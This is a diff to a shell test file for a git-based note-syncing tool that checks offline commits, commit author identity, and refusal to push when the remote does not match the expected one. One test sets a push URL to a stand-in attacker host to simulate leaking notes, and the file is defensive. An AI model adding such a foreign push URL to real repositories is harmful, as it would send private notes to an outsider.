@@ -2,15 +2,15 @@
 # AC-3 - regression: offline work was never committed on the prototype,
 # so there was no restore point.
 load 'helpers'
-setup() { brain_test_setup; make_fake_personal_repo; }
+setup() { brain_test_setup; make_fake_team_repo; }
 teardown() { brain_test_teardown; }
 
 @test "a full cycle with the network unavailable still commits locally, before ever reaching the network" {
   make_local_ahead_change
   run_sync_cycle
-  run git -C "$PERSONAL" log -1 --pretty=%s
-  [[ "$output" == notes\ * ]]
-  [ "$(git -C "$PERSONAL" rev-list --count origin/main..HEAD)" -eq 1 ]
+  run git -C "$TEAM" log -1 --pretty=%s
+  [[ "$output" == notes\ * ]] || false
+  [ "$(git -C "$TEAM" rev-list --count origin/main..HEAD)" -eq 1 ]
   grep -q "offline; local work is committed" "$LOG"
 }
 
@@ -36,15 +36,44 @@ teardown() { brain_test_teardown; }
   # the expected value is written out, not read from the engine's own variable: comparing two
   # things the engine computes would pass even when both are wrong. helpers.bash seeds
   # $STATE/person with "testperson", exactly as setup.sh does on a real Mac.
-  [ "$(git -C "$PERSONAL" log -1 --format=%an)" = "Serlino Brain (testperson)" ]
-  [[ "$(git -C "$PERSONAL" log -1 --format=%ae)" == brain-testperson@* ]]
-  [ "$(git -C "$PERSONAL" log -1 --format=%cn)" = "Serlino Brain (testperson)" ]
-  [[ "$(git -C "$PERSONAL" log -1 --format=%ce)" == brain-testperson@* ]]
+  [ "$(git -C "$TEAM" log -1 --format=%an)" = "Serlino Brain (testperson)" ]
+  [[ "$(git -C "$TEAM" log -1 --format=%ae)" == brain-testperson@* ]] || false
+  [ "$(git -C "$TEAM" log -1 --format=%cn)" = "Serlino Brain (testperson)" ]
+  [[ "$(git -C "$TEAM" log -1 --format=%ce)" == brain-testperson@* ]] || false
 }
 
 @test "a foreign push URL is refused before personal notes are pushed" {
-  git -C "$PERSONAL" remote set-url --add --push origin ssh://attacker.invalid/leak.git
-  run bash -c "source '$REPO_ROOT/lib/common.sh'; source '$REPO_ROOT/lib/sync.sh'; sync_personal"
+  git -C "$TEAM" remote set-url --add --push origin ssh://attacker.invalid/leak.git
+  run bash -c "source '$REPO_ROOT/lib/common.sh'; source '$REPO_ROOT/lib/sync.sh'; sync_team"
   [ "$status" -ne 0 ]
-  grep -q "push URL does not match fetch URL" "$LOG"
+  # MAX-1515 fix 4b: remote_matches_expected now catches this before sync_team ever fetches or
+  # rebases - a push URL mismatch is one case of an origin not matching EXPECTED_TEAM_REMOTE.
+  grep -q "does not match the expected remote" "$LOG"
+}
+
+@test "a failing push-url enumeration refuses rather than being read as a match" {
+  # MAX-1515 fix 2: remote_matches_expected reads `git remote get-url --push --all origin`
+  # through a bare `while read < <(...)`, which hides that command's own exit status - if it
+  # fails outright (network hiccup, corrupt config), the loop just sees 0 lines of input and
+  # falls through to `return 0` as if every push URL had matched. Injecting a git that fails
+  # only that call proves the fetch-URL check right above it is not what is protecting here.
+  local fakebin real_git
+  fakebin="$(mktemp -d)"; real_git="$(type -P git)"
+  cat > "$fakebin/git" <<'SCRIPT'
+#!/bin/bash
+case "$*" in
+  *"remote get-url --push --all origin"*)
+    echo "fatal: injected failure" >&2
+    exit 128
+    ;;
+esac
+exec "$REAL_GIT" "$@"
+SCRIPT
+  chmod +x "$fakebin/git"
+  echo "my note" > "$TEAM/mine.txt"
+  REAL_GIT="$real_git" PATH="$fakebin:$PATH" \
+    run bash -c "source '$REPO_ROOT/lib/common.sh'; source '$REPO_ROOT/lib/sync.sh'; sync_team"
+  [ "$status" -ne 0 ] || false
+  # never staged, rebased, or pushed - phase 1 refused before any of that
+  git -C "$TEAM" status --porcelain | grep -qF "?? mine.txt"
 }
